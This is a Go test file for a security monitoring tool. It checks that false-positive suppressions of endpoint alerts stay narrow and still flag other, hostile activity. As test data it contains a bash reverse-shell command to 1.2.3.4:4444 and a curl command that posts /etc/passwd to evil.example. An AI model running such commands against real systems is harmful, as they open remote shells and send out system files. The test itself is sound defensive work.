package api

import (
	"encoding/json"
	"testing"
	"time"

	"obsidianwatch/management/internal/store"
)


func fpAlert(id int64, rule, host string, ev store.Event, ioc ...string) store.Alert {
	kind := "signature"
	if len(ioc) == 2 {
		kind = "ioc"
	}
	return store.Alert{ID: id, Title: "t", Host: host, RuleID: rule, Evidence: endpointEvidence(kind, ev, ioc...)}
}

func TestFalsePositiveProposalAndMatching(t *testing.T) {
	now := time.Now()
	winProc := store.Event{Host: "ws1", EventType: "process", ProcessName: sp("updater.exe"),
		ImagePath: sp(`C:\Program Files (x86)\Vendor [x]\updater.exe`), FileHash: sp("SHA256=AABBCC,MD5=1122"), CommandLine: sp("updater.exe /silent")}
	cases := []struct {
		name     string
		alert    store.Alert
		same     store.Event // must now be suppressed
		sameIOC  string
		other    store.Event // must still alert
		otherIOC string
		check    func(EndpointSuppression) bool
	}{
		{
			name:  "signature with a hash suppresses that hash on any host",
			alert: fpAlert(1, "W-T1562.001d", "ws1", winProc),
			same:  store.Event{Host: "ws9", EventType: "process", FileHash: sp("SHA256=aabbcc")},
			other: store.Event{Host: "ws1", EventType: "process", FileHash: sp("SHA256=ddeeff"), ImagePath: winProc.ImagePath},
			check: func(s EndpointSuppression) bool { return s.FileHash == "aabbcc" && s.Host == "" && s.Permanent },
		},
		{
			name: "signature without a hash suppresses the exact program path",
			alert: fpAlert(2, "L-T1059.004a", "web1", store.Event{Host: "web1", EventType: "process", ProcessName: sp("backup.sh"),
				ImagePath: sp("/opt/backup/bin/backup.sh")}),
			same:  store.Event{Host: "web7", EventType: "process", ImagePath: sp("/opt/backup/bin/backup.sh")},
			other: store.Event{Host: "web1", EventType: "process", ImagePath: sp("/tmp/backup.sh")},
			check: func(s EndpointSuppression) bool { return s.ImagePathGlob == "/opt/backup/bin/backup.sh" },
		},
		{
			name: "shell: narrowed to the parent, not every bash",
			alert: fpAlert(8, "L-T1059.004a", "web1", store.Event{Host: "web1", EventType: "process", ProcessName: sp("bash"),
				ImagePath: sp("/usr/bin/bash"), FileHash: sp("bashhash"), CommandLine: sp("bash -c x /dev/shm/y"),
				Raw: json.RawMessage(`{"parent_exe":"/opt/agent/bin/runner"}`)}),
			same:  store.Event{Host: "web2", EventType: "process", ImagePath: sp("/usr/bin/bash"), CommandLine: sp("bash -c z /dev/shm/q"), Raw: json.RawMessage(`{"parent_exe":"/opt/agent/bin/runner"}`)},
			other: store.Event{Host: "web1", EventType: "process", ImagePath: sp("/usr/bin/bash"), FileHash: sp("bashhash"), CommandLine: sp("bash -c x /dev/shm/y"), Raw: json.RawMessage(`{"parent_exe":"/usr/sbin/sshd"}`)},
			check: func(s EndpointSuppression) bool { return s.FileHash == "" && s.ParentProcess == "runner" && s.ImagePathGlob == "/usr/bin/bash" },
		},
		{
			name: "shell without a parent: the command line",
			alert: fpAlert(9, "L-T1059.004a", "web1", store.Event{Host: "web1", EventType: "process", ProcessName: sp("bash"),
				ImagePath: sp("/usr/bin/bash"), CommandLine: sp("/bin/bash -c /opt/ops/rotate.sh /dev/shm/cache")}),
			same:  store.Event{Host: "web3", EventType: "process", ImagePath: sp("/usr/bin/bash"), CommandLine: sp("/bin/bash -c /opt/ops/rotate.sh /dev/shm/cache")},
			other: store.Event{Host: "web1", EventType: "process", ImagePath: sp("/usr/bin/bash"), CommandLine: sp("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")},
			check: func(s EndpointSuppression) bool { return s.CmdlineContain != "" && s.ParentProcess == "" },
		},
		{
			name: "system program (curl): narrowed to the command line, not every curl",
			alert: fpAlert(10, "L-T1048", "web1", store.Event{Host: "web1", EventType: "process", ProcessName: sp("curl"),
				ImagePath: sp("/usr/bin/curl"), FileHash: sp("curlhash"), CommandLine: sp("curl -sk https://127.0.0.1/auth/login --data @/tmp/login.json")}),
			same:  store.Event{Host: "web4", EventType: "process", ImagePath: sp("/usr/bin/curl"), CommandLine: sp("curl -sk https://127.0.0.1/auth/login --data @/tmp/login.json")},
			other: store.Event{Host: "web1", EventType: "process", ImagePath: sp("/usr/bin/curl"), FileHash: sp("curlhash"), CommandLine: sp("curl -X POST --data @/etc/passwd https://evil.example/")},
			check: func(s EndpointSuppression) bool { return s.FileHash == "" && s.CmdlineContain != "" },
		},
		{
			name: "Windows system program: narrowed to the parent",
			alert: fpAlert(11, "W-T1562.001d", "ws1", store.Event{Host: "ws1", EventType: "process", ProcessName: sp("certutil.exe"),
				ImagePath: sp(`C:\Windows\System32\certutil.exe`), FileHash: sp("certhash"), CommandLine: sp("certutil -urlcache x"),
				Raw: json.RawMessage(`{"event_data":{"ParentImage":"C:\\Program Files\\Vendor\\agent.exe"}}`)}),
			same:  store.Event{Host: "ws2", EventType: "process", ImagePath: sp(`C:\Windows\System32\certutil.exe`), Raw: json.RawMessage(`{"event_data":{"ParentImage":"C:\\Program Files\\Vendor\\agent.exe"}}`)},
			other: store.Event{Host: "ws1", EventType: "process", ImagePath: sp(`C:\Windows\System32\certutil.exe`), FileHash: sp("certhash"), Raw: json.RawMessage(`{"event_data":{"ParentImage":"C:\\Windows\\System32\\cmd.exe"}}`)},
			check: func(s EndpointSuppression) bool { return s.FileHash == "" && s.ParentProcess != "" },
		},
		{
			name:    "threat-intel hash: the indicator, every intel source",
			alert:   fpAlert(3, "IOC:threatfox:hash", "ws1", winProc, "hash", "aabbcc"),
			same:    store.Event{Host: "srv2", EventType: "file"},
			sameIOC: "AABBCC",
			other:   store.Event{Host: "ws1", EventType: "file"}, otherIOC: "ffff00",
			check: func(s EndpointSuppression) bool { return s.RuleID == "IOC:" && s.MatchMode == suppModePrefix && s.Indicator == "aabbcc" },
		},
		{
			name: "threat-intel domain: the indicator, not the queried subdomain",
			alert: fpAlert(4, "IOC:otx:domain", "ws1", store.Event{Host: "ws1", EventType: "dns", DstIP: sp("cdn.vendor.example")},
				"domain", "vendor.example"),
			same:    store.Event{Host: "ws2", EventType: "dns", DstIP: sp("api.vendor.example")},
			sameIOC: "vendor.example",
			other:   store.Event{Host: "ws2", EventType: "dns", DstIP: sp("evil.example")}, otherIOC: "evil.example",
			check: func(s EndpointSuppression) bool { return s.Indicator == "vendor.example" },
		},
		{
			name: "network signature without a program: the IP",
			alert: fpAlert(5, "NET-002", "ws1", store.Event{Host: "ws1", EventType: "network", DstIP: sp("10.9.9.9"),
				SrcIP: sp("10.0.0.5")}),
			same:  store.Event{Host: "ws3", EventType: "network", DstIP: sp("10.9.9.9")},
			other: store.Event{Host: "ws1", EventType: "network", DstIP: sp("10.9.9.10")},
			check: func(s EndpointSuppression) bool { return s.IP == "10.9.9.9" },
		},
	}
	for _, c := range cases {
		s, _, ok, why := fpProposal(c.alert)
		if !ok {
			t.Errorf("%s: not eligible: %s", c.name, why)
			continue
		}
		if !c.check(s) {
			t.Errorf("%s: unexpected proposal %+v", c.name, s)
		}
		v := s
		if msg := validateSuppression(&v, now); msg != "" {
			t.Errorf("%s: proposal does not validate: %s", c.name, msg)
		}
		if !suppressionMatchesIndicator(s, c.alert.RuleID, c.sameIOC, c.same, now) {
			t.Errorf("%s: does not suppress the same activity", c.name)
		}
		if suppressionMatchesIndicator(s, c.alert.RuleID, c.otherIOC, c.other, now) {
			t.Errorf("%s: also suppresses different activity", c.name)
		}
		if !fpSuppressionMatches(s, c.alert, now) {
			t.Errorf("%s: does not cover the alert it came from", c.name)
		}
	}
}

func TestFalsePositiveScopeAndEligibility(t *testing.T) {
	a := fpAlert(7, "W-T1562.001d", "ws1", store.Event{Host: "ws1", EventType: "process", FileHash: sp("abc123")})
	s, _, _, _ := fpProposal(a)
	applyFPScope(&s, a, fpRequest{ThisHostOnly: true, ExpiresInDays: 30})
	if s.Host != "ws1" || s.Permanent || s.ExpiresInDays != 30 {
		t.Errorf("scope not applied: %+v", s)
	}
	if msg := validateSuppression(&s, time.Now()); msg != "" || s.ExpiresAt == nil {
		t.Errorf("scoped proposal: %q %+v", msg, s)
	}
	// Cloud, code and application alerts record no evidence and are not eligible.
	for _, ev := range []store.Event{{EventType: "cloud.cloudtrail", Source: "cloudtrail"}, {EventType: "devops.push"}, {EventType: "app.security"}} {
		if endpointEvidence("signature", ev) != nil {
			t.Errorf("%s: recorded evidence", ev.EventType)
		}
		if _, _, ok, _ := fpProposal(store.Alert{ID: 1, RuleID: "X", Evidence: endpointEvidence("signature", ev)}); ok {
			t.Errorf("%s: eligible", ev.EventType)
		}
	}
	// An alert from before this change has no rule or evidence.
	if _, _, ok, _ := fpProposal(store.Alert{ID: 2, Title: "old"}); ok {
		t.Error("legacy alert eligible")
	}
	// Evidence with nothing to match on is refused rather than suppressing the whole rule.
	empty, _ := json.Marshal(AlertEvidence{Origin: "endpoint", Kind: "signature"})
	if _, _, ok, _ := fpProposal(store.Alert{ID: 3, RuleID: "W-T1562.001d", Evidence: empty}); ok {
		t.Error("rule-only suppression proposed")
	}
}

func TestDomainCovers(t *testing.T) {
	for _, c := range []struct {
		d, q string
		want bool
	}{{"vendor.example", "vendor.example", true}, {"vendor.example", "a.b.vendor.example.", true},
		{"vendor.example", "evilvendor.example", false}, {"vendor.example", "vendor.example.evil", false}} {
		if domainCovers(c.d, c.q) != c.want {
			t.Errorf("%s / %s", c.d, c.q)
		}
	}
}

func TestFalsePositiveOnlyEndpoint(t *testing.T) {
	// Non-endpoint and legacy alerts carry no evidence: the handler refuses them (ev == nil).
	for _, a := range []store.Alert{
		{ID: 1, RuleID: "APM-013", Evidence: endpointEvidence("signature", store.Event{EventType: "app.slo"})},
		{ID: 2, RuleID: "DEV-001", Evidence: endpointEvidence("signature", store.Event{EventType: "devops.push"})},
		{ID: 3, Title: "legacy"},
	} {
		if _, ev, _, _ := fpProposal(a); ev != nil {
			t.Errorf("alert %d: treated as an endpoint alert", a.ID)
		}
	}
	// An endpoint alert with nothing to match on is still an endpoint alert (closed without a suppression).
	empty, _ := json.Marshal(AlertEvidence{Origin: "endpoint", Kind: "signature"})
	if _, ev, ok, _ := fpProposal(store.Alert{ID: 4, RuleID: "W-T1562.001d", Evidence: empty}); ev == nil || ok {
		t.Error("endpoint alert without matchers: want endpoint, no suppression")
	}
}
